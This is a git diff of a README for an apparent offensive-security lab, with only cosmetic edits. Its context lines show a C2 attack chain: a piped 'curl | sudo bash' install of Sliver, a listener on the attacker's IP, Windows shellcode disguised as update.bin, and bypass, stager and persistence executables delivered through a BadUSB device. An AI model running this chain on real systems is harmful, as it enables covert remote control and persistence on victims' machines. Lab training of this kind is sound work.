@@ -38,7 +38,7 @@ After completing this laboratory, you should understand:
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ curl <https://sliver.sh/install> | sudo bash
+└─$ curl https://sliver.sh/install | sudo bash
 
 ┌──(kali㉿kali)-[~]
 └─$ sliver
@@ -91,7 +91,7 @@ Ensure all files are placed in their designated locations as shown in the projec
 
 Follow the official guide: Pico-Ducky Setup
 
-### 2. Generate Bypass.exe
+### 2. Generate bypass.exe
 
 Open "**x64 Native Tools Command Prompt for VS**":
 
@@ -99,7 +99,7 @@ Open "**x64 Native Tools Command Prompt for VS**":
 C:\Program Files\Microsoft Visual Studio\18\Community> cl.exe bypass.c
 ```
 
-### 3. Generate Stager.exe
+### 3. Generate stager.exe
 
 ```bash
 ┌──(kali㉿kali)-[~/c2]
@@ -120,14 +120,14 @@ C:\Program Files\Microsoft Visual Studio\18\Community> cl.exe bypass.c
 └─$ [127.0.0.1] sliver > mtls -L <attacker's IP> -l 443
 ```
 
-### 5. Generate Update.bin
+### 5. Generate update.bin
 
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ [127.0.0.1] sliver > generate --mtls <attacker's IP>:443 --os windows --arch amd64 --format shellcode --save /home/kali/c2/update.bin
 ```
 
-### 6. Generate Persistence.exe
+### 6. Generate persistence.exe
 
 ```bash
 ┌──(kali㉿kali)-[~]
